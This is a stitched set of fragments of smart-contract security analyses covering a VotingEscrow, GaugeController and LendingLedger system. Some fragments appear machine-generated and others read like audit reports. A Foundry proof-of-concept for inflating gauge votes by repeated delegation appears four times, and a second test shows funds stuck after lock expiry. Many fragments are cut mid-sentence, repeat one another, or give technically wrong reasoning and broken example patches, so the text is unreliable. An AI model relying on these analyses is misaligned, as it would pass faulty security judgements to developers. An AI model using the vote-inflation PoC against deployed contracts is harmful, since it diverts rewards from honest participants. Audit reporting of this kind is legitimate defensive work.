The issue arises when the lending market allows users to deposit funds and earn rewards, but it does not accurately manage the users' deposited balances and rewards. This can result in a loss of unclaimed rewards for the user.\n\nTo exploit this vulnerability, an attacker could first deposit funds into the lending market and earn rewards. Then, they would withdraw their deposits from the lending market without claiming their rewards first. The smart contract code would zero out the tracked deposited balance without checking whether the user has already claimed their rewards, resulting in a loss of unclaimed rewards for the user.\n\nThe vulnerability is present because the smart contract code does not perform any checks to ensure that the user's rewards are claimed before they withdraw their deposits. The function `sync_ledger` is responsible for updating the lending market's total balance and checking if the updated balance falls within a valid range (i.e., non-negative). However, this check is only performed on the lending market's total balance and not on the user's individual deposited balance.\n\nTherefore, I would recommend adding an additional check in the function `sync_ledger` to ensure that any changes made to a user's deposited balance are accompanied by a corresponding update to their rewards balance. This would prevent the double withdrawal attack and ensure that users receive the full value of their rewards.",

The vulnerability type is \"Unclaimed Rewards\" and the reason for this conclusion is as follows:\n\nThe `sync_ledger` function updates the lender's balance in the `lendingMarketBalances` mapping. However, it does not check whether the user has already claimed their rewards before updating the balance. This means that if a user deposits funds and earns rewards but fails to claim them before the rewards are updated, they will lose access to their unclaimed rewards.\n\nTo fix this vulnerability, we can add a check before updating the lender's balance in `sync_ledger` function to ensure that the user has claimed their rewards before updating the balance. This check can be done by checking if the user's balance in the `lendingMarketBalances` mapping is equal to the total amount of funds they have deposited, and if they have not claimed any rewards yet. If these conditions are met, we can update the lender's balance in the `lendingMarketBalances` mapping without losing their unclaimed rewards.\n\nHere is an example patch that demonstrates this fix:\n```solidity\nfunction sync_ledger(address _lender, int256 _delta) external {\n    address lendingMarket = msg.sender;\n    require(lendingMarketWhitelist[lendingMarket], \"Market not whitelisted\");\n\n    // Check if the user has claimed their rewards before updating their balance\n    uint256 totalDepositedBalance = lendingMarketBalances[lendingMarket][_lender][currEpoch];\n    require(totalDepositedBalance == 0, \"User has not claimed their rewards\");\n\n    _checkpoint_lender(lendingMarket, _lender, type(uint256).max);\n    uint256 currEpoch = (block.timestamp / WEEK) * WEEK;\n    int256 updatedLenderBalance = int256(lendingMarketBalances[lendingMarket][_lender][currEpoch])",

This means that if an attacker passes a negative value for `_delta`, it can cause a floor division error during calculation, which can lead to a revert of the transaction.\n\nThe most likely vulnerability type in this code is a \"Floor Division Error\" DoS vulnerability. The attacker can exploit this vulnerability by passing a very large or negative value for `_delta`, which will cause the function to run out of gas and revert the transaction, effectively causing a Denial of Service attack.\n\nThe reason for this vulnerability is that the `require` statement in the code checks only whether the updated balance is non-negative (i.e., greater than or equal to 0), but it does not ensure that the value being assigned to the balance is non-negative.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Incorrect calculation of total voting power: As you mentioned in your vulnerability knowledge, the code does not account for funding fees when updating the total voting power. This can lead to an inflated total voting power compared to actual user-generated voting power, making it impossible for users to reach unanimous decisions.\n2. Insufficient validation: The code does not perform sufficient validation on input parameters. For example, it does not check if a gauge address is valid or if the weight is within the allowed range (0-10_000). This can lead to incorrect behavior and vulnerabilities in the contract.\n3. Unprotected function calls: The code makes function calls without checking their return values. If any of these functions fail, it could cause the contract to revert or behave unexpectedly, leading to a Denial of Service attack.\n4. Inconsistent data storage: The code stores data in multiple mappings and arrays, which can lead to inconsistencies between different pieces of data. For example, if the code updates the voting power for a user but does not update the total voting power correctly, it could lead to an inconsistency that can be exploited by attackers.\n5.

Use modifiers to ensure that function calls are properly validated and checked for errors.\n3. Implement a mechanism to protect against reentrancy attacks and front-running opportunities.\n4.

The function then updates the voting power used by the sender by adding the new slope's power to the previous one and subtracting the old slope's power. It also checks if the lock end time is greater than the next week, and if so, it removes the old slope changes from the weight and sum of slopes for the given gauge address and next time.\n\nThe function then schedules recording of initial slope for the next time by adding the new bias and slope to the `points_weight` and `points_sum` mappings for the given gauge address and next time. It also adds the new slope changes for the new slopes to the `changes_weight` and `changes_sum` mappings.

It then checks if the weight is within the range `[0, 10000]`. If it's not, it reverts with an error.\n2. The function also checks if the gauge at `_gauge_addr` is valid by looking up its address in a mapping `isValidGauge`. If it's not, it reverts with an error.\n3.

It then calculates the slope and bias of the user's current voting power.\n4. Next, the function checks if the user is allowed to vote by checking if their lock period has expired. If it hasn't, it reverts with an error.\n5. After that, the function retrieves the old slope and bias for the given gauge address `_gauge_addr`. It then calculates the new slope and bias using the user weight and the current time.\n6. The function then checks if the new slope and bias are valid by checking their ranges.

This can be exploited by an attacker who has previously voted on a gauge, then removes it from the system and re-adds it before the next reward cycle.\n2. The attacker can cause a large amount of computational effort to be consumed by the contract's `_get_sum()` function, which is used to calculate the total weight for all gauges in the system. This effort is proportional to the number of gauges that have been re-added during a new cycle but before rewards are queued.\n3. The vulnerability can be exploited by an attacker who controls multiple gauges and votes on them. By removing their gauges from the system, then re-adding them before the next reward cycle, they can cause the contract to consume excessive computational effort when it calculates the total weight for all gauges in the system.\n4. The vulnerability is mitigated by ensuring that gauges are re-added only after rewards are queued for the cycle.

Therefore, an attacker could call the `vote_for_gauge_weights` function multiple times in rapid succession to manipulate the voting power of other users.\n\nThe PoC for this vulnerability would involve calling the `vote_for_gauge_weights` function multiple times with different weights for a single user within a short period of time (e.g., one week). The attacker could use this functionality to manipulate the voting power of other users in the system and potentially steal assets from them.\n\nTo mitigate this vulnerability, it is recommended to add an additional check to ensure that only one vote can be cast for a single gauge within a certain block period (e.g., one week). This can be done by adding an additional variable to track the last time a user voted for a particular gauge and checking if the current time is less than or equal to the voting window (e.g., one week) plus the last vote time. If this check fails, the function should revert any changes made and return an error message indicating that the user has already voted within the specified period.\n\nHere is an example of how the modified `vote_for_gauge_weights` function could look like:\n```solidity\nfunction vote_for_gauge_weights(address _gauge_addr, uint256 _user_weight) external {\n    require(_user_weight >= 0 && _user_weight <= 10_000, \"Invalid user weight\");\n    require(isValidGauge[_gauge_addr], \"Invalid gauge address\");\n    VotingEscrow ve = votingEscrow;\n    (\n        ,\n        /*int128 bias*/\n        int128 slope_, /*uint256 ts*/\n\n    ) = ve.getLastUserPoint(msg.sender);\n    require(slope_ >= 0, \"Invalid slope\");",

Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

The reason for this vulnerability is that the `delegate()` function contains two separate calls to the `_delegate()` function, which could potentially lead to an infinite loop of recursive calls if the `LockAction` parameter is set to `UNDELEGATE`.\n\nHere's why:\n\n1. In the first call to `_delegate()`, the `fromLocked` and `toLocked` variables are updated based on the values in the `locked_` variable.\n2. If the `LockAction` parameter is set to `UNDELEGATE`, then the `require()` function will check whether the delegatee's lock has expired, and if it has, then it will call the `_delegate()` function again with the updated values of `fromLocked` and `toLocked`.\n3. In this second call to `_delegate()`, the same checks are performed, but now the `LockAction` parameter is set to `DELEGATE`, which means that the delegatee's lock will be extended instead of being undelegated.\n4. This creates a loop where the first call to `_delegate()` leads to the second call, and then the second call leads back to the first call again, causing an infinite loop of recursive calls.\n\nTo fix this vulnerability, you can modify the `delegate()` function by using a different approach, such as checking whether the delegatee's lock has expired before undelegating it, or by using a different mechanism to update the locks in the smart contract.",

This can lead to potential circumvention of system incentives and undesired consequences.\n\nTo fix this vulnerability, a patch could be applied to the `delegate` function by adding a check to ensure that the tokens are not already delegated. For example:\n```\nfunction delegate(address _addr) external nonReentrant {\n    LockedBalance memory locked_ = locked[msg.sender];\n    require(locked_.amount > 0, \"No lock\");\n    require(!isDelegated(locked_.delegatee), \"Already delegated\");\n    ... // rest of the function code\n}\n```\nThis patch will prevent an attacker from re-delegating tokens that have already been delegated.\n\nHowever, it is important to note that this vulnerability can be exploited by a malicious actor who has the ability to create multiple accounts and lock tokens for different durations.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0.

This function first checks if the given gauge address is already valid using the `isValidGauge` mapping, and then adds the gauge address to the mapping if it is not already valid.\n\nThe vulnerability arises when a malicious actor calls the `add_gauge` function with a non-zero weight for a gauge that was previously added but has since been removed from the system (i.e., its weight has been set to zero). This can cause an incorrect total weight calculation, as the `isValidGauge` mapping is not updated when a gauge's weight is set to zero. As a result, some gauges may be left without rewards or allow a malicious actor to perform a Denial of Service (DOS) attack on selected gauges by preventing them from receiving rewards.\n\nTo mitigate this vulnerability, the `add_gauge` function should be modified to ensure that gauges are only added after their corresponding weights have been queued for the current cycle. This can be achieved by adding a check in the function that ensures the gauge's weight has been queued before it is added to the system.\n\nIn conclusion, the provided smart contract code is vulnerable to a re-entrancy attack caused by the `add_gauge` function.

This modifier is set using the `require` statement, which ensures that the function is executed only if the condition specified in the require statement is true.

The `isValidGauge` mapping is used to keep track of whether a given address has already been added as a gauge or not.

This ensures that there is no duplication of gauges and that only valid addresses can be added as gauges.\n3. The `emit NewGauge` statement emits an event when a new gauge is added, which allows other parts of the contract to respond to this event and take appropriate actions.\n\nBased on these checks, it seems that the smart contract code is not vulnerable to the Improper Access Control and Misuse of User Allowances vulnerability.

In this case, the function `add_gauge` appears to be responsible for adding a new gauge to the system. The only condition that needs to be met in order for the gauge to be added is that it does not already exist in the system.

There are 2 ways to set this value: through `_get_weight` and `_change_gauge_weight`. \n```solidity\nfunction _get_weight(address _gauge_addr) private returns (uint256) {\n        uint256 t = time_weight[_gauge_addr];\n        if (t > 0) {\n            Point memory pt = points_weight[_gauge_addr][t];\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n            return pt.bias;\n        } else {\n            return 0;\n        }\n    }\n``` \nThe problem in `_get_weight` is that the initial value of any `time_weight[_gauge_addr]` will be 0. It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0. Any  time a user will use `_get_weight` to fill with recent data, the function will iterate over old values and will do nothing. Recent values won't be set and anything depending on it will receive 0 as a recent value.\n```solidity\n    function _change_gauge_weight(address _gauge, uint256 _weight) internal {\n        uint256 old_gauge_weight = _get_weight(_gauge);\n        uint256 old_sum = _get_sum();\n        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;\n\n        points_weight[_gauge][next_time].bias = _weight;\n        time_weight[_gauge] = next_time;\n\n        uint256 new_sum = old_sum + _weight - old_gauge_weight;\n        points_sum[next_time].bias = new_sum;\n        time_sum = next_time;\n    }\n```\nSince `_change_gauge_weight` is not called within `add_gauge`, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

The reason for this is that there is a potential reentrancy bug in the `delegate` function. Specifically, if a user calls the `delegate` function with a zero address as the `_addr` parameter, it will trigger an undelegate action and call the `_delegate` function twice: once for the current delegatee (if not the zero address) and once for the new delegatee (the zero address). This could lead to unexpected behavior and potentially allow attackers to steal funds from the user.\n\nHere is a more detailed explanation of the vulnerability:\nThe `delegate` function in the smart contract code has a potential reentrancy bug because it calls the `_delegate` function twice, once for the current delegatee (if not the zero address) and once for the new delegatee (the zero address). This means that if an attacker sends a transaction with a zero address as the `_addr` parameter, they could potentially cause the `_delegate` function to be called multiple times, leading to unexpected behavior and potentially allowing them to steal funds from the user.\nThe vulnerability can be mitigated by implementing a check that prevents users from delegating back to the zero address, ensuring that their funds remain safe and recoverable.

Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

To fix this vulnerability, we would need to ensure that the smart contract checks whether the user has enough tokens before updating their locked amount to 0.

This can lead to incorrect calculations of rewards and other unexpected behavior. To fix this vulnerability, the function should properly validate the input parameters and use appropriate data types to avoid integer overflow or underflow conditions.\n\nIn conclusion, the given smart contract code is vulnerable to an integer underflow attack due to the `withdraw` function's usage of `uint128(locked_.amount)` expression, which can result in incorrect calculations of rewards and other unexpected behavior when the input value exceeds the maximum value that can be represented by `uint128`.

The reason for this vulnerability is that the smart contract code does not correctly update the timestamp of the last token staking or withdrawal when a user's balance is zero.\n\nTo understand why this is a problem, let's first review the functionality of the given code:\n\n1. When a user wants to withdraw tokens, the code checks if there are any locked tokens associated with their address and if so, updates the lock accordingly.\n2. The code then calculates the amount of tokens to send back to the user based on their current balance and the amount that was locked.\n3. Finally, the code sends the tokens back to the user using the `call` function.\n\nNow, let's analyze the vulnerability:\n\nThe vulnerability occurs when a user first stakes tokens, withdraws all of them, and subsequently stakes more tokens again. During the second staking, if the balance is zero, the system does not update the timestamp correctly, causing an incorrect calculation based on an outdated timestamp during the user's second withdrawal. This leads to a situation where more tokens can be withdrawn than what the user is supposed to be able to withdraw.\n\nThe reason this vulnerability occurs in the given smart contract code is that it does not correctly update the timestamp of the last token staking or withdrawal when a user's balance is zero. Specifically, the code only updates the timestamp if the user has any locked tokens associated with their address and if so, it checks if the lock has expired or not. However, this check does not take into account the case where a user's balance is zero but they have a lock that has not yet expired.\n\nTo mitigate this vulnerability, the smart contract code should always update the timestamp of the last token staking or withdrawal for any elapsed time, regardless of the user's token balance or other conditions. This ensures accurate calculations during both token stakings and withdrawals and prevents users from withdrawing more tokens than they should be able to.\n\nIn conclusion, the given smart contract code is vulnerable to the \"Inaccurate Timestamp Updates in Token Staking and Withdrawal\" vulnerability type",

However, if a user withdraws all of their tokens and subsequently stakes more tokens again, the timestamp will not be updated correctly for the second staking. This leads to an incorrect calculation based on an outdated timestamp during the user's second withdrawal, allowing them to withdraw more tokens than they should be able to.\n\nTo mitigate this vulnerability, the `withdraw` function could include a check to update the timestamp regardless of the user's token balance or other conditions. For example, the smart contract code could use an `if` statement to check if the current block timestamp is greater than the last update timestamp before updating it.\n\nHere is an example patch for the `withdraw` function that includes this check:\n```solidity\nfunction withdraw() external nonReentrant {\n    LockedBalance memory locked_ = locked[msg.sender];\n    // Validate inputs\n    require(locked_.amount > 0, \"No lock\");\n    require(locked_.end <= block.timestamp, \"Lock not expired\");\n    require(locked_.delegatee == msg.sender, \"Lock delegated\");\n    // Update lock\n    uint256 amountToSend = uint256(uint128(locked_.amount));\n    LockedBalance memory newLocked = _copyLock(locked_);\n    newLocked.amount = 0;\n    newLocked.end = 0;\n    newLocked.delegated -= int128(int256(amountToSend));\n    newLocked.delegatee = address(0);\n    locked[msg.sender] = newLocked;\n    // Update timestamp if needed\n    uint256 currentBlockTimestamp = block.timestamp;\n    if (currentBlockTimestamp > ts.lastUpdate) {\n        ts.lastUpdate = currentBlockTimestamp;\n    }\n    //",

When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.\n\n## Proof of Concept\nTo exit the system, Alice must call `withdraw()`. However, since they've delegated, they will not be able to.\n```solidity\nfunction withdraw() external nonReentrant {\n\t...\n\trequire(locked_.delegatee == msg.sender, \"Lock delegated\");\n\t...\n}\n```\nTo re-delegate to themselves (undelegate), they call `delegate(alice.address)`. However, there is a check to see if `toLocked.end` has expired, which would be true since it would point to Alice's lock.\n```\nfunction delegate(address _addr) external nonReentrant {\n\tLockedBalance memory locked_ = locked[msg.sender];\n\t...\n\tLockedBalance memory fromLocked;\n\tLockedBalance memory toLocked;\n\tlocked_.delegatee = _addr;\n\tif (delegatee == msg.sender) {\n\t\t...\n\t// @audit this else if will execute\n\t} else if (_addr == msg.sender) {\n\t\t// Undelegate\n\t\tfromLocked = locked[delegatee]; // @audit Delegatee\n\t\ttoLocked = locked_; // @audit Alice's lock\n\t}\n\t...\n\trequire(toLocked.end > block.timestamp, \"Delegatee lock expired\");\n```\n\nThis is a test to be added into VoteEscrow.t.sol. It can be manually run by executing `forge test --match-test testUnSuccessUnDelegate`. \n```solidity\nfunction testUnSuccessUnDelegate() public {\n\ttestSuccessDelegate();\n\tvm.warp(ve.LOCKTIME() + 1 days);\n\n\t// Try to undelegate\n\tvm.startPrank(user1);\n\tvm.expectRevert(\"Delegatee lock expired\");\n\tve.delegate(user1);\n\n\t// Still user2\n\t(, , , address delegatee) = ve.locked(user1);\n\tassertEq(delegatee, user2);\n}\n```\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nConsider refactoring the code to skip `toLocked.end > block.timestamp` if undelegating. For example, adding a small delay (e.g., 1 second) to the lock end time when a user undelegates.\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nTiming",

The contract has a `withdraw` function that allows users to withdraw their locked tokens after they have expired or been delegated. However, this function does not properly update the user's staked amount before sending the tokens back to them. Instead, it sets the user's staked amount to 0 and updates the delegatee address to `address(0)`.\n2. The `withdraw` function uses the `_copyLock` function to create a new locked balance object for the user with the same properties as the old one except for the amount, which is set to 0. However, this new locked balance object does not update the delegatee address or remove any delegations, so it could potentially be used in future unstaking events even though the tokens have been withdrawn.\n3. The contract also uses the `_checkpoint` function to check if the user's staked amount has changed since the last time they called `withdraw`. However, this function does not properly update the user's staked amount if it is 0. Therefore, even if the user's tokens have been withdrawn, their staked amount could still be non-zero and could potentially be used in future unstaking events.\n\nTo fix this vulnerability, you should make sure to properly update the user's staked amount before sending them their tokens back using the `withdraw` function. This can be done by adding a line of code that updates the user's staked amount to 0 after setting the new locked balance object's amount to 0 and updating its delegatee address to `address(0)`.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

However, it does not check if the vote was actually recorded before making changes to the slope. This means that an attacker can try to front-run other users by making a vote at the same time as another user, effectively allowing them to increase their voting power without using any of their own tokens.\n\nTo exploit this vulnerability, the attacker would need to have access to the smart contract code and be able to manipulate the blockchain to make a vote before the intended user. Once they have done so, they can then update their own slope and effectively increase their voting power without losing any of their tokens.\n\nTo mitigate this vulnerability, the `vote_for_gauge_weights` function should include additional checks to ensure that votes are only recorded after they have been confirmed on the blockchain. This can be done by checking the transaction hash of the vote before making any changes to the slope. If the transaction hash is not found on the blockchain, then it is likely that the vote has not yet been confirmed and should not be processed.\n\nIn summary, the smart contract code provided is vulnerable to a type of attack called \"front-running\" due to a lack of checks for votes being recorded before making changes to the slope.",

